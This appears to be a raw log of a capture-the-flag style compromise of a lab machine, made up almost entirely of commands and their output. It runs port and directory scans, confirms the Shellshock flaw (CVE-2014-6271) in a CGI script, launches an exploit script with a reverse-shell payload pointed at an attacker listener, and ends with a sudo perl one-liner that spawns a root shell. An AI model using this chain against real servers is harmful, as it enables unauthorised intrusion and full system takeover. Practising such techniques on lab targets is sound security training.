nmap -p- -sV -sC 10.10.10.56                     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 22:10 EDT
Nmap scan report for 10.10.10.56
Host is up (0.044s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.20 seconds


gobuster dir -e -u 10.10.10.56/cgi-bin/ -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/small.txt -x sh,pl

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              pl,sh
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/12 22:37:07 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.56/cgi-bin/user.sh              (Status: 200) [Size: 119]
                                                                         
===============================================================
2021/06/12 22:37:21 Finished



nmap -sV -p8081 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls 127.0.0.1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 23:58 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000094s latency).

PORT     STATE SERVICE VERSION
8081/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       user.sh
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds


└─$ python 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.5 lport=1337 pages=/cgi-bin/user.sh


[+] Possible sudo pwnage!
/usr/bin/perl

sudo /usr/bin/perl -e 'exec "/bin/sh"'